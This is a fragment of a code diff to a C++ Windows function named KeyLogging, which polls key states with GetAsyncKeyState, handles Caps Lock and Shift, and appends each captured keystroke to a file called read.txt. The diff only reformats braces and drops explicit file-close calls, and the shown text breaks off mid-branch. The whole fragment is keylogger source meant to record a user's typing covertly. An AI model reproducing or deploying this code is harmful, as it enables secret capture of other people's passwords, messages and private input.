@@ -18,14 +18,11 @@ void KeyLogging() {
 			if (GetAsyncKeyState(c) & 0x0001) {
 				ofstream insertFile("read.txt", ios::app);
 				if (c > 64 && c < 91) {
-					if (GetKeyState(VK_CAPITAL) == 0) {
+					if (GetKeyState(VK_CAPITAL) == 0) 
 						insertFile << char(c + 32);
-						insertFile.close();
-					}
-					else {
+					
+					else 
 						insertFile << c;
-						insertFile.close();
-					}
 				}
 				else if (c == 48) {
 					if (GetAsyncKeyState(VK_SHIFT)) 
